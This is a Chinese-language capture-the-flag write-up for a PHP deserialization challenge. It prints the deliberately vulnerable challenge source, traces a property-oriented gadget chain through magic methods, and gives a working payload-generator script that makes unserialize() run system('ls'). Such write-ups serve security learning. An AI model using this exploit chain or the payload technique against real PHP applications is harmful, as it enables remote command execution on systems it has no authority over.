¶题目

<?php

error_reporting(0);

class A{

    private $value = False;
    public  $name = True;
    protected $hook = '';
    public $data = [];
    private $check = [];
    public $obj = [];

    function toJson(){
        if($this->name){
            json_decode($this->hook->getStr($this->data));
        }else{
            echo "No No No";
        }
    }

    function  __toString(){
        if($this->value){
            $this->toJson();
        }
    }

    function __call($method, $args){
        if(in_array($method, $this->check)){
            call_user_func_array($this->obj, $args);
        }
    }
}

class B{

    private $file;
    protected $bl = false;

    function __destruct(){
        $this->close();
        $this->getFile();
    }

    function getFile(){
        if(file_exists($this->file)){
            file_get_contents($this->file);
        }else{
            echo "fffffggg";
            exit;
        }
    }

    function close(){
        if(!$this->bl){
            exit;
        }
    }
}

class C{

    private $file = '1';
    public $content = '123';

    function removeFile(){
        if(file_exists($this->file)){
            unlink($this->file);
        }
    }
    function getStr($sess='', $id='1'){
        if($sess == 'put'){
            $this->file = $this->file.".txt";
            if(!preg_match('/php/i', $this->file))
                file_put_content($this->file, $this->content);
        }else{
            file_put_contents($this->file,"Log Log Log");
        }
    }
}

class D{

    private $hook = [];
    public $closure = '';
    private $name = '';

    function __call($method, $args){
        if(in_array($method, $this->hook)){
            call_user_func_array([$this, 'getstr'], $args);
        }
    }

    function getValue($data){
        if($data){
            call_user_func($data[0], $data[1]);
        }
    }

    function getstr(){
        echo "GO Go GO Go!";
        exit;
    }
}

if($_GET['eas']){
    unserialize(base64_decode($_GET['eas']));
}else{
    highlight_file(__FILE__);
}

¶思路

切入点只有一个**$_GET[‘eas’]**，且能作为作为反序列化入口的只有B中的destruct()魔术方法。

而这题中的出口有很多，把包括D中call中的call_user_func_array方法，getValue中的call_user_func，C中的file_put_content方法。

call_user_func_array方法和call_user_func方法存在任意代码执行漏洞

file_put_content方法存在任意文件写入漏洞，所以这题应该有两种思路。但是因为写php的能力还不够强，所以目前只写第一种思路

首先，序列化会触发的只有在B中的destruct()方法，而destruct()方法中有一个指向getFile()方法，而getFile()方法中有一个会调用到一个$file属性。

在这里停住了，我们需要把这个链连到D这个类中，所以开始观察，D中有一个call()方法，当调用这个类中不存在的方法时才会启用，但是我们在B中getFile()的链头没法直接钩到D中，而C也没有能钩链的地方，所以只能钩到A。

而A中发现了一个toString()方法可以用来钩，所以考虑将B中的file赋值为new A()；之后将会触发toString。修改value值为true后进入toJson，而tojson中发现一个getStr()方法（一开始以为这是一个内部方法所以卡在这了很久），这是一个不存在的方法，很容易和call钩起来。之后call中的**$method就是getStr**，所以将check赋值为getStr就能进入if中，而这里的call_user_func_array方法刚好能连接到D中的getValue()，将obj赋值为**[new D,‘getValue’]即可调用。又看到D中的call_user_func（）存在两个用都好隔开的可控变量，所以将data赋值为[“system”,“ls”]**，就可以查看。

整体链条：

B:destruct -> getFile -> A:toString -> toJson -> call -> D:getValue

¶pop构造

<?php

error_reporting(0);

class A{

    public $value = True; 
    public  $name = True;
    public $hook='';
    public $data = [];
    public  $check = [];
    public $obj = [];
    function __construct(){
        $this->value = True; //3.A:toString -> A:toJson
        $this->name = True;
        $this->hook='';
        $this->data = ["system","ls"];
        $this->check = ["getStr"];
    }
}
class B{
    public $file;
    protected $bl = false;
    function __construct(){
        $this->bl = true;
    }
}
class D{
    public $hook = [];
    public $closure = '';
    public $name = '';
}


$a = new B();  //1.B：destruct() -> B:getFile
$a->file = new A(); //2.B:getFile -> A: toSting
$a->file->hook = new A(); //4.A: toJsono -> A: call
$a->file->obj = [new D,'getValue']; //5.A:call -> D:getValue

echo base64_encode(serialize($a));
?>
  1. 创建B的实例化对象，销毁时触发destruct()方法
  2. 将B中的file值赋值为new A()，使其钩链到A中触发toString()
  3. 将A的value值改写为True，使链进入toJson
  4. 将hook值改为new A()，则语句变为A->getStr（），因为getStr不存在，所以触发call
  5. call中method为getStr，所以将check改为getStr进入if，将obj改为[new D,‘getValue’]，意义为在D这个对象类中调用getValue方法
  6. 为了getValue的执行，将data 赋值为 [“system”,“ls”]；就可以查看当前的所有文件名，从而进行进一步操作。
